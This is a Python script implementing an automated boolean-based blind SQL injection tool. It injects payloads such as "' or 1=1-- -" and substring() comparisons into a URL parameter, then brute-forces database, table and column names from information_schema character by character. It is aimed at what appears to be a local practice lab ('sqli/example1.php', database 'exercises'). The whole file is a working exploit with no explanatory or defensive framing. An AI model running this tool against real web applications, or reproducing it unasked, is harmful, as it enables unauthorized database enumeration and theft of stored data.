import sys
import requests
from enum import Enum


class DataBaseOptions(Enum):
    databases = 0
    tables = 1
    colums = 2


class SQLInjector:
    __caracteres: str = 'abcdefghijklmnñopqrstuvwxyz0123456789_$,'
    __resultadoPositivo: bytes
    __sesion = None
    __iniciado: bool = False
    __url: str = ""

    def __init__(self, cookiesrequiered: dict, url: str):
        self.__url = url
        self.__iniciado = True
        self.__sesion = requests.Session()
        for key in cookiesrequiered:
            self.__sesion.cookies.set(key, cookiesrequiered[key])
        self.__resultadoPositivo = self.__sesion.get(url=(url + "' or 1=1-- -")).content

    # "select schema_name from information_schema.schemata limit 0,1;"
    # "select table_name from information_schema.tables where table_schema='FHD' limit 1,1;"
    @staticmethod
    def __generarConsultaObtenerFilaBasica(columname: str, database: str, table: str, fila: int):
        return "select " + columname + " from " + database + "." + table + " limit " + str(fila) + ",1"

    @staticmethod
    def __generarConsultaObtenerFilaTablas(database: str, fila: int):
        return "select table_name from information_schema.tables where table_schema='" + \
               database + "' limit " + str(fila) + ",1"

    @staticmethod
    def __generarConsultaObtenerColumnaTabla(database: str, tabla: str, fila: int):
        return "select column_name from information_schema.columns where table_name='" + tabla + \
               "' and table_schema='" + database + "' limit " + str(fila) + ",1"

    def __generarConsultaObtenerFilaBlind(self, tipo: DataBaseOptions, columname: str,
                                          database: str, table: str, fila: int, comparador: str):
        if tipo == DataBaseOptions.databases:
            return "' or substring((" + \
               self.__generarConsultaObtenerFilaBasica(columname, database, table, fila) + \
               "),1," + str(comparador.__len__()) + ")='" + comparador + "'-- -"
        elif tipo == DataBaseOptions.tables:
            return "' or substring((" + \
               self.__generarConsultaObtenerFilaTablas(database, fila) + \
               "),1," + str(comparador.__len__()) + ")='" + comparador + "'-- -"
        elif tipo == DataBaseOptions.colums:
            return "' or substring((" + \
               self.__generarConsultaObtenerColumnaTabla(database, table, fila) + \
               "),1," + str(comparador.__len__()) + ")='" + comparador + "'-- -"
        else:
            return "' or 1=1-- -"

    def __buscar(self, tipo: DataBaseOptions, columname: str, database: str, table: str, fila: int, comparador: str):
        resultado: str = ""
        for caracter in self.__caracteres:
            url = self.__url + \
                  self.__generarConsultaObtenerFilaBlind(tipo, columname, database, table, fila, comparador + caracter)
            result = self.__sesion.get(url=url)
            if result.content == self.__resultadoPositivo:
                resultado += caracter
                break
        if resultado.__len__() > 0:
            resultado += self.__buscar(tipo, columname, database, table, fila, comparador + resultado)
        return resultado

    def buscarDatabases(self):
        continuar: bool = True
        resultado: list = []
        posicion: int = 0
        while continuar:
            retorno = self.__buscar(DataBaseOptions.databases, "schema_name", "information_schema", "schemata", posicion, "")
            if retorno.__len__() > 0:
                resultado.append(retorno)
                posicion += 1
            else:
                continuar = False
        return resultado

    def buscarTablasAll(self):
        return

    def buscarTablas(self, database: str):
        continuar: bool = True
        resultado: list = []
        posicion: int = 0
        while continuar:
            retorno = self.__buscar(DataBaseOptions.tables, "", database, "", posicion, "")
            if retorno.__len__() > 0:
                resultado.append(retorno)
                posicion += 1
            else:
                continuar = False
        return resultado

    def buscarColumnas(self, database: str, tabla: str):
        continuar: bool = True
        resultado: list = []
        posicion: int = 0
        while continuar:
            retorno = self.__buscar(DataBaseOptions.colums, "", database, tabla, posicion, "")
            if retorno.__len__() > 0:
                resultado.append(retorno)
                posicion += 1
            else:
                continuar = False
        return resultado


inyec = SQLInjector({}, "http://192.168.0.106/sqli/example1.php?name=root")
print(inyec.buscarDatabases())
print(inyec.buscarTablas("information_schema"))
print(inyec.buscarTablas("exercises"))
print(inyec.buscarColumnas("exercises", "users"))
